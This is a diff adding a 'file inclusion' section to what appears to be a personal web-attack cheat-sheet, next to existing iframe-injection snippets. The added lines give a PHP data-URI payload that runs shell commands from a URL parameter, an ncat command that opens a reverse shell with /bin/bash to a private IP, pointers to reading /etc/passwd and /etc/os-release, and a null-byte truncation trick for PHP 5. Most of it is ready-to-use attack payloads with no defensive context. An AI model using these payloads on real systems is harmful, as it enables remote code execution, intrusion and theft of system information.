@@ -119,3 +119,14 @@ web
         <iframe src="http://IP" height="30" width="40"> </iframe> #height and width can be set as 0
 
         <iframe src="http://192.168.1.140" height="30" width="40"> </iframe>
+
+file inclusion
+    data:text/plain,<?php%20$var=shell_exec($_GET[%27cmd%27]);%20echo%20$var%20?>&cmd=/bin/nc* 
+
+	ncat -nv 192.168.65.129  2233 -e /bin/bash  /proc/version
+
+           # get the info of the machine
+                etc/passwd etc/os-release
+
+    php5.X %00 will cut the afterward econtent.   
+
